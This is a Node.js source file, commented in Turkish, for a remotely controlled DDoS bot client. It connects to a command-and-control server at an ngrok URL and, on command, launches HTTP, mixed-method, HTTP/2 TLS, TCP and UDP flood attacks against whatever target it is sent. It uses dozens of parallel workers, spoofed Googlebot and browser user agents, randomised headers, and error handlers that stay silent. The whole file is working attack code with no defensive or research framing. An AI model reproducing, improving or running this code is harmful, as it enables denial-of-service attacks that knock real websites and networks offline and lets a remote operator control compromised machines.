const io = require("socket.io-client");
const http = require("http");
const https = require("https");
const { URL } = require("url");
const crypto = require("crypto");
const tls = require("tls");
const http2 = require("http2");
const dgram = require('dgram');
const net = require("net");
const { faker } = require("@faker-js/faker");


// WebSocket bağlantısı
const socket = io("https://0027-176-240-67-249.ngrok-free.app");

let isFlooding = false;
let floodingTimeout;

// WebSocket bağlantısında başarılı olunduğunda mesaj yazdırıyoruz
socket.on("connect", () => {
  console.log("Server'a bağlanıldı!");
});

// WebSocket'ten gelen yeni mesajları dinliyoruz
socket.on("new_message", (data) => {
  console.log("Yeni mesaj:", data);

  if (data && data.method === "httpflood") {
    console.log("HTTP Flood saldırısı başlatılıyor...");
    startFlooding(data.url, data.port, data.duration, "httpflood");
  } else if (data && data.method === "http-mix") {
    console.log("HTTP Mix saldırısı başlatılıyor...");
    startFlooding(data.url, data.port, data.duration, "http-mix");
  } else if (data && data.method === "tls") {
    console.log("TLS saldırısı başlatılıyor...");
    startTlsFlooding(data.url, data.duration);
  } else if (data && data.method === "tcpflood") {
    console.log("TCP Flood saldırısı başlatılıyor...");
    startTcpFlooding(data.url, data.port, data.duration);
  } else if (data && data.method === "udpflood") {
    console.log("UDP Flood saldırısı başlatılıyor...");
    startUdpFlooding(data.url, data.port, data.duration);
  } else if (data && data.method === "stopAttack") {
    console.log("Saldırı durduruluyor...");
    stopFlooding();
  } else {
    console.log("Bilinmeyen bir method alındı veya veri geçersiz.");
  }
});

// Rastgele User-Agent oluşturucu
function generateUserAgent() {
  const platforms = ["Macintosh", "Windows", "X11"];
  const macSystems = ["68K", "PPC", "Intel Mac OS X"];
  const windowsSystems = [
    "Win3.11",
    "WinNT3.51",
    "WinNT4.0",
    "Windows NT 5.0",
    "Windows NT 5.1",
    "Windows NT 5.2",
    "Windows NT 6.0",
    "Windows NT 6.1",
    "Windows NT 6.2",
    "Win 9x 4.90",
    "Windows XP",
    "Windows 7",
    "Windows 8",
    "Windows NT 10.0; Win64; x64",
  ];
  const linuxSystems = ["Linux i686", "Linux x86_64"];
  const browsers = ["chrome", "spider", "ie"];
  const browserTokens = [
    ".NET CLR",
    "SV1",
    "Tablet PC",
    "Win64; IA64",
    "Win64; x64",
    "WOW64",
  ];
  const spiders = [
    "AdsBot-Google (http://www.google.com/adsbot.html)",
    "Baiduspider (http://www.baidu.com/search/spider.htm)",
    "FeedFetcher-Google (http://www.google.com/feedfetcher.html)",
    "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
    "Googlebot-Image/1.0",
    "Googlebot-News",
    "Googlebot-Video/1.0",
  ];

  const platform = platforms[Math.floor(Math.random() * platforms.length)];
  let os = "";
  if (platform === "Macintosh") {
    os = macSystems[Math.floor(Math.random() * macSystems.length)];
  } else if (platform === "Windows") {
    os = windowsSystems[Math.floor(Math.random() * windowsSystems.length)];
  } else if (platform === "X11") {
    os = linuxSystems[Math.floor(Math.random() * linuxSystems.length)];
  }

  const browser = browsers[Math.floor(Math.random() * browsers.length)];
  if (browser === "chrome") {
    const webkit = Math.floor(Math.random() * (599 - 500) + 500);
    const version = `${Math.floor(Math.random() * 100)}.0.${Math.floor(Math.random() * 10000)}.${Math.floor(Math.random() * 1000)}`;
    return `Mozilla/5.0 (${os}) AppleWebKit/${webkit}.0 (KHTML, like Gecko) Chrome/${version} Safari/${webkit}`;
  } else if (browser === "ie") {
    const version = `${Math.floor(Math.random() * 100)}.0`;
    const engine = `${Math.floor(Math.random() * 100)}.0`;
    const token =
      Math.random() > 0.5
        ? `${browserTokens[Math.floor(Math.random() * browserTokens.length)]}; `
        : "";
    return `Mozilla/5.0 (compatible; MSIE ${version}; ${os}; ${token}Trident/${engine})`;
  } else {
    return spiders[Math.floor(Math.random() * spiders.length)];
  }
}

// Rastgele başlıklar oluşturucu
function generateRandomHeaders() {
  return {
    Accept: [
      "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
      "text/plain;q=0.8,image/png,*/*;q=0.5",
    ][Math.floor(Math.random() * 3)],
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": ["gzip, deflate", "gzip"][Math.floor(Math.random() * 2)],
    "User-Agent": generateUserAgent(),
    "X-Custom-Header": crypto.randomBytes(6).toString("hex"),
  };
}

// Rastgele POST verisi oluşturma fonksiyonu
function generateRandomData() {
  return JSON.stringify({
    username: crypto.randomBytes(8).toString("hex"),
    email: crypto.randomBytes(12).toString("hex") + "@gmail.com",
    message: crypto.randomBytes(16).toString("hex"),
  });
}


// UDP Flood saldırısını başlatma fonksiyonu
function startUdpFlooding(targetIP, targetPort, duration) {
  if (isFlooding) {
    console.log("Zaten saldırı yapılıyor.");
    return;
  }

  isFlooding = true;
  const packetSize = 1024; // 1 KB veri
  const threadCount = 50; // Paralel çalışan işçi işlemler
  const endTime = Date.now() + duration * 1000; // Saldırının bitiş zamanı
  const message = Buffer.alloc(packetSize, 'X'); // Rastgele veri oluştur

  console.log(`UDP Flood saldırısı başlatıldı. ${duration} saniye boyunca hedef: ${targetIP}:${targetPort}`);

  floodingTimeout = setTimeout(() => {
    stopFlooding(); // Süre bitince saldırıyı durduruyoruz
  }, duration * 1000);

  // Paralel işçi işlemleri başlat
  for (let i = 0; i < threadCount; i++) {
    floodUdp(targetIP, targetPort, message, endTime);
  }
}

// UDP Flood'un bir işçi fonksiyonu
function floodUdp(targetIP, targetPort, message, endTime) {
  const client = dgram.createSocket('udp4');

  const sendPackets = setInterval(() => {
    if (!isFlooding || Date.now() >= endTime) { // isFlooding kontrolü eklendi
      clearInterval(sendPackets); // Saldırı süresi bittiğinde durdur
      client.close();
    } else {
      client.send(message, targetPort, targetIP, (err) => {
        if (err) {
          console.log("Hata oluştu:", err);
        }
      });
    }
  }, 0); // Hızlı paket gönderimi
}


function startTcpFlooding(targetIP, targetPort, duration) {
  const threadCount = 52; // Sabit thread sayısı
  const payload = crypto.randomBytes(5024); // 1 KB veri
  const endTime = Date.now() + duration;

  if (isFlooding) {
    console.log("Zaten saldırı yapılıyor.");
    return;
  }

  isFlooding = true;
  console.log(
    `TCP Flood saldırısı başlatıldı. ${duration} ms boyunca hedef: ${targetIP}:${targetPort}`,
  );

  floodingTimeout = setTimeout(() => {
    console.log("Saldırı sona erdi.");
    stopFlooding(); // Saldırı süresi bitince saldırıyı durduruyoruz
  }, duration);

  for (let i = 0; i < threadCount; i++) {
    createPersistentConnection(i, targetIP, targetPort, payload, endTime);
  }
}

// Sürekli TCP bağlantı ve veri gönderimi
function createPersistentConnection(
  threadIndex,
  targetIP,
  targetPort,
  payload,
  endTime,
) {
  const socket = new net.Socket();

  // Sahte IP adresi oluşturuluyor
  const fakeIP = faker.internet.ip(); // Faker ile sahte IP üretme

  // Keep-Alive özelliği etkinleştirildi
  socket.setKeepAlive(true, 100); // Her 1 saniyede bir Keep-Alive paketi gönder

  const reconnect = () => {
    if (isFlooding) {
      //console.log(`Thread ${threadIndex}: Yeniden bağlanıyor...`);
      setTimeout(() => {
        createPersistentConnection(
          threadIndex,
          targetIP,
          targetPort,
          payload,
          endTime,
        );
      }, 0);
    }
  };

  socket.connect(targetPort, targetIP, () => {

    const sendData = () => {
      if (!socket.destroyed && Date.now() < endTime) {

          //console.log('success');

        socket.write(payload, (err) => {
          if (err) {
            socket.destroy();
            reconnect();
          }
        });
        setTimeout(sendData, 0);
      } else {
        socket.destroy();
      }
    };

    sendData();
  });

  socket.on("error", () => {}); // Hataları bastırıyoruz
  socket.on("close", () => {
    reconnect();
  });
}



// HTTP Flood ve HTTP Mix saldırısını başlatma fonksiyonu
function startFlooding(targetUrl, port, duration, method) {
  const url = new URL(targetUrl);
  const protocol = url.protocol === "https:" ? https : http;
  const threadCount = 58;
  const endTime = Date.now() + duration;

  if (isFlooding) {
    console.log("Zaten saldırı yapılıyor.");
    return;
  }

  isFlooding = true;
  console.log(
    `${method.toUpperCase()} saldırısı başlatıldı. ${duration} ms boyunca hedef: ${targetUrl}`,
  );

  floodingTimeout = setTimeout(() => {
    stopFlooding();
  }, duration);

  for (let i = 0; i < threadCount; i++) {
    (function flood() {
      if (!isFlooding) {
        return;
      }

      if (method === "httpflood") {
        sendRequest(targetUrl, protocol, port, "POST");
      } else if (method === "http-mix") {
        const randomMethod = ["GET", "POST", "PUT", "DELETE"][
          Math.floor(Math.random() * 4)
        ];
        sendRequest(targetUrl, protocol, port, randomMethod);
      }
      setTimeout(flood, 1);
    })();
  }
}

// İstek gönderme fonksiyonu
function sendRequest(targetUrl, protocol, port, method) {
  const postData =
    method === "POST" || method === "PUT" ? generateRandomData() : null;
  const headers = generateRandomHeaders();
  const url = new URL(targetUrl);
  const options = {
    hostname: url.hostname,
    port: port || (protocol === "https:" ? 443 : 80),
    path:
      url.pathname +
      (method === "GET" || method === "DELETE"
        ? `?id=${Math.floor(Math.random() * 1000)}`
        : ""),
    method,
    headers: {
      ...headers,
      ...(postData ? { "Content-Length": Buffer.byteLength(postData) } : {}),
    },
  };

  const req = protocol.request(options, (res) => {
    res.on("data", () => {});
  });

  req.on("error", (error) => {});

  if (postData) {
    req.write(postData);
  }
  req.end();
}

process.on("uncaughtException", () => {});

process.on("unhandledRejection", () => {});

function startTlsFlooding(targetUrl, duration) {
  const parsedTarget = new URL(targetUrl);

  const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
  const ciphers =
    "GREASE:" +
    [
      defaultCiphers[2],
      defaultCiphers[1],
      defaultCiphers[0],
      ...defaultCiphers.slice(3),
    ].join(":");

  const sigalgs =
    "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
  const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

  const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1;

  const secureProtocol = "TLS_client_method";
  const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol,
  });

  isFlooding = true;

  floodingTimeout = setTimeout(() => {
    stopFlooding();
  }, duration);

  const settings = {
    enablePush: false,
    initialWindowSize: 1073741823,
  };

  (function flood() {
    if (!isFlooding) return; // Saldırı kontrolü
    const tlsOptions = {
      secure: true,
      ALPNProtocols: ["h2"],
      ciphers: ciphers,
      sigalgs: sigalgs,
      ecdhCurve: ecdhCurve,
      secureOptions: secureOptions,
      secureContext: secureContext,
      servername: parsedTarget.hostname,
      rejectUnauthorized: false,
      secureProtocol: secureProtocol,
    };

    try {
      const tlsConn = tls.connect(
        parsedTarget.port || 443,
        parsedTarget.hostname,
        tlsOptions,
      );

      tlsConn.setKeepAlive(true, 60000);
      tlsConn.setNoDelay(true);

      const client = http2.connect(parsedTarget.href, {
        protocol: "https:",
        settings: settings,
        createConnection: () => tlsConn,
      });

      client.on("connect", () => {
        const interval = setInterval(() => {
          if (!isFlooding) {
            // Saldırı durdurulduğunda bağlantıyı temizle
            clearInterval(interval);
            client.destroy();
            return;
          }
          try {
            for (let i = 0; i < 8; i++) {
              const headers = generateRandomHeaders();
              const request = client.request(headers).on("response", () => {
                request.close();
                request.destroy();
              });
              request.end();
            }
          } catch (err) {
            // Hataları sessizce yoksay
          }
        }, 1000);
      });

      client.on("close", () => {
        client.destroy();
      });

      client.on("error", () => {
        // Hataları sessizce yoksay
      });
    } catch (err) {
      // Hataları sessizce yoksay
    }

    setTimeout(flood, 0);
  })();
}

// Flood saldırısını durdurma fonksiyonu
function stopFlooding() {
  isFlooding = false;
  clearTimeout(floodingTimeout);
  console.log("Saldırı durduruldu.");
}

